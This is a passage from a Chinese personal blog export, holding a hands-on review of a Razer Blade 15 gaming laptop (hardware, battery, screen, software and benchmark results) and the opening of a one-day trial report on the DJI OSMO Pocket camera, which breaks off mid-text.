代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 可以在支持的软件内使键盘背光与软件内容同步</span></p>\n<p><strong>不过由于雷蛇的服务器在大陆一向不稳定，雷云在实际体验上真的是…一言难尽。</strong>有时候会莫名开机不自启、主面板无限加载、灯光配置无法应用…心累。</p>\n<p>此外，显卡驱动似乎也不太稳定（这大概是英伟达的锅？）。偶尔屏幕会突然黑掉，需要合盖再开盖才能再次唤醒屏幕；甚至有一次我遇到了 10 分钟内连续两次蓝屏…至少从错误代码来看问题出在显卡驱动。不过这些问题遇到的几率也不大，一个月内绝大部分时间它还是正常工作的，显卡驱动也没有在我游戏的时候崩掉过。还算能用吧。</p>\n<h1>性能</h1>\n<p>作为妥妥的游戏本，Razer Blade 15 配备了 i7-9750H，RTX2070 Max-Q，16 GB 内存，<strong>性能自然是不差的，基本达到了这一水平笔记本的一般水准。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"702\" height=\"400\" class=\"aligncenter size-full wp-image-1410\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19.jpg 702w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer19-300x171.jpg 300w\" sizes=\"(max-width: 702px) 100vw, 702px\"></a>\n<p><span>CPU-Z 和 GPU-Z</span></p>\n<p>i7-9750H 默频 2.60GHz，睿频可达 4GHz 左右，<strong>然而只是 30 秒真男人。</strong>25度室温、高性能模式下 30 秒左右的满负载就会让这块 CPU 撞墙，频率会掉到 3GHz 出头并稳定在此，<strong>而平衡模式则更快。</strong></p>\n<p>Razer Blade 15 配备的是一块 Max-Q 版本的 RTX2070，<strong>而且是较低功耗 80W 的版本</strong>，猜测是为了散热考虑（毕竟这么薄了）。风扇全开散热时风扇声音较响，但仍能忍受；而且日常工作使用一般不会使风扇转起来，<strong>因此噪音控制还算不错。</strong></p>\n<p>由于是这篇算是简评，并没有详测游戏，直接上跑分吧。室温 25 度， 平衡模式下 Cinebench R20 分数 1927，有些偏低；而使用高性能模式时分数直接飙到 2424 分，看来平衡模式功耗墙砍得比较狠。（顺便提一句，雷蛇甚至提供了功耗更低的性能方案，没有什么测试的必要就不测了。）</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"753\" height=\"637\" class=\"aligncenter size-full wp-image-1405\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17.jpg 753w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer17-300x254.jpg 300w\" sizes=\"(max-width: 753px) 100vw, 753px\"></a>\n<p>在 3DMark Time Spy 测试下平衡模式 6283 分，高性能模式 6872 分，相比有一点的提升。只能说压得够狠。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"954\" class=\"aligncenter size-full wp-image-1406\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-300x149.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-768x382.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer18-1024x509.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>平衡模式</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1920\" height=\"957\" class=\"aligncenter size-full wp-image-1408\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20.jpg 1920w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-300x150.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-768x383.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer20-1024x510.jpg 1024w\" sizes=\"(max-width: 1920px) 100vw, 1920px\"></a>\n<p><span>高性能模式</span></p>\n<p>至于这 16GB 的内存…至少我是完全够用，要升级的话也可以自行更换到最高 64GB。</p>\n<h1>总结</h1>\n<p>这已经不是雷蛇第一年做笔记本了。总的来看，雷蛇似乎已经有些摸清了门道。今年年中推出的配备 9 代 Intel CPU 的灵刃系列几乎可以说是在各个方面都做到了尽可能完美。当然问题也有一些，相信雷蛇可以在后续解决。总结一下我手头的这台笔记本吧。</p>\n<p>优点：</p>\n<ul>\n<li>高性能的同时有较长续航</li>\n<li>优秀的屏幕</li>\n<li>干净的外观设计</li>\n<li>薄而坚固的机身</li>\n<li>较丰富的 IO</li>\n<li>细节到位（Wi-Fi 6、Windows Hello 等等）</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>价格稍高</li>\n<li>驱动、软件等有些不稳定</li>\n<li>为了散热有一定的性能损失</li>\n<li>机身偏重</li>\n</ul>\n<p>当我正准备结束这篇简评的时候正好收到了雷蛇雷云驱动更新，其中包含了我这一型号的「问题修复与改进」。待会儿就去更新，看看雷蛇有没有解决一部分问题吧。</p>\n<p>最后加一句，本文所有图片都是由一加 7 Pro 拍摄的，也就这样吧…</p>\n","link":"https://flyhigher.top/diary/1411.html"},{"title":"OSMO Pocket 一日试用报告","date":"2019-02-02 09:38:38","description":"\n<p>计划寒假出门练练延时视频的拍摄，碰巧得知老师买了一个 <a href=\"https://www.dji.com/osmo-pocket\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">OSMO Pocket</a>，正好我对这玩意儿有点兴趣，就向老师借了一天玩了玩，带着它在城市里跑了一圈，这篇文章算是试用后的总结报告。不过这毕竟只是一天快速试用之后的总结，如果有不正确或是不完善的地方还请见谅。</p>\n<p><strong>TL;DR:</strong> 这款产品目前应该只适用于重度 Vlog 拍摄者，相对其他拍摄方案有一些优势，但也有很多不足。对我来说，我本来没有太强烈的购买 OSMO Pocket 的欲望，试用过后依然没有太大的购买欲望。<strong>请谨慎考虑购买。</strong></p>\n<p>（如果出二代我可能会买吧…（小声）</p>\n<blockquote><p>这篇文章中所有图片和视频<strong>都经过二次压缩以缩短在网页上的加载时间，不代表 OSMO Pocket 的真实拍摄水平</strong>（当然所有评测都基于未压缩的原始图像），如果需要原始图像可以直接联系我。另外，本文中的多数照片/视频都是“为评测而拍”，没有刻意追求美感，虽然观感不一定好，但这不代表 OSMO Pocket 就拍不出好看的照片/视频——<strong>毕竟“人”才是一张照片是否“美”的决定因素。</strong></p></blockquote>\n<h1>初印象</h1>\n<p><strong>到手的第一印象：好小啊。</strong>虽然对 OSMO Pocket 已经提前有所了解，但刚刚接触它时仍惊讶于它的体积。就算有一层保护壳， OSMO Pocket 还是可以被轻松地放进口袋里，相对于手机+稳定器的方案，OSMO Pocket 便携多了，好评。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1867\" height=\"2500\" class=\"aligncenter size-full wp-image-1313\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/3.jpg 1867w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-224x300.jpg 224w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-768x1028.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/3-765x1024.jpg 765w\" sizes=\"(max-width: 1867px) 100vw, 1867px\"></a>\n<p><strong>完全启动的速度挺快</strong>，不过屏幕不大。屏幕支持触摸，而机身上的实体按键只有两个。简单试用了下，在屏幕上的操作主要以滑动为主，操作逻辑还算清晰，不过这个触屏对于点击的灵敏度真的挺低的，经常出现点击却没有反应的情况 。两个实体按键之一就是拍摄键，熟悉了之后操作效率还是很高的。好评。</p>\n<p>不过由于屏幕小，实际情况下很多操作无法在屏幕上完成，<strong>因此连接手机后的 OSMO Pocket 才算得上是完整体。</strong>其与手机的连接通过物理连接（连接头）实现（不过可以通过配件实现无线连接）。</p>\n<p>我拿到 OSMO Pocket 时它已经被使用了一段时间了，手机连接头已经插在机身上了。虽然这个连接头可以卸下并反装（以保护连接头）或者换上接口保护板，但是实际操作中要卸下连接头非常麻烦，所以一般情况下为了方便使用，连接头只能以这种有点难看的姿势插在机身上。DJI 甚至考虑到了这个问题，在保护壳的绑带上切了个口子，方便连接头伸出…</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2279\" class=\"aligncenter size-full wp-image-1314\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/2.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-263x300.jpg 263w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-768x875.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/2-899x1024.jpg 899w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>奇葩的保护壳</p>\n<p>机身底部是一个 USB Type-C 接口，用来充电，好评。不过没有标准螺口，没法直接固定在三脚架上，需要购买额外配件，很难受。</p>\n<p>此外使用时需要从机身侧面插入一张 SD 卡用于存储拍摄内容，通过配套的 DJI Mimo APP 可以将拍摄的内容传输到手机上。DJI Mimo 同时可以在 OSMO Pocket 连接到手机后作为拍摄控制器使用。</p>\n<p>第一眼看上去，OSMO Pocket 的镜头看起来跟普通手机的镜头差不多，不过具体表现还是要在试用后才能知道。</p>\n<h1>绝赞试用中</h1>\n<p>大概熟悉了一下操作，我第二天就带着 OSMO Pocket 出门了。<strong>最大的感受是太小巧了，至少比手机+稳定器的组合甚至是 GoPro+延长杆的组合要小很多</strong>，这带来了两方面的影响，一是我可以更快地进入拍摄状态，实测我从摸口袋到 OSMO Pocket 完成启动进入拍摄状态不超过 10 秒钟；二是小巧的机身也让 OSMO Pocket 在拍摄时显得更加低调，让我这种脸皮比较薄的人减少了很多心理压力。<strong>综合起来就是让我更愿意经常取出它来拍摄了。</strong></p>\n<h2>拍摄体验</h2>\n<p>我第一个使用的功能是延时视频，结果发现没有标准螺口带来的问题比我想象的还要严重。总之最后为了能顺利地拍完延时，我不得不用一种很难受的姿势把它摁在三脚架的云台上并这样保持十几分钟…然而就算是这样后来还是翻车了（</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2428\" height=\"2500\" class=\"aligncenter size-full wp-image-1350\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/15.jpg 2428w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-291x300.jpg 291w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-768x791.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/02/15-995x1024.jpg 995w\" sizes=\"(max-width: 2428px) 100vw, 2428px\"></a>\n<p>完全没法固定</p>\n<blockquote><p>买配件是不可能买配件的，这辈子都不可能买配件的，只能靠暴力摁住才勉强拍的了延时这个样子。</p></blockquote>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo3.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.webm\" type=\"video/webm\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/3.mp4\" type=\"video/mp4\">你的浏览器太旧，无法观看此视频。</source></source></video></p>\n<p>摁得太用力了，三脚架云台没锁牢转偏了…</p>\n<p><strong>一个优点是拍摄延时视频时可以让云台按设定好的轨迹自动旋转。</strong>不过直接在内建屏幕上只能设定两个云台位置关键点，要连接手机才能比较方便地设定最多不超过四个关键点。延时视频的拍摄不支持防抖，任何轻微的抖动都会可能会导致成品在导出之后需要进行额外的防抖处理。</p>\n<p><video controls poster=\"https://acdn.flyhigher.top/wp-content/uploads/2019/02/osmo2.jpg\" preload=\"none\"><source src=\"https://video.flyhigher.top/flyhigher/osmo/2.webm\" type=\"video/webm\"><source 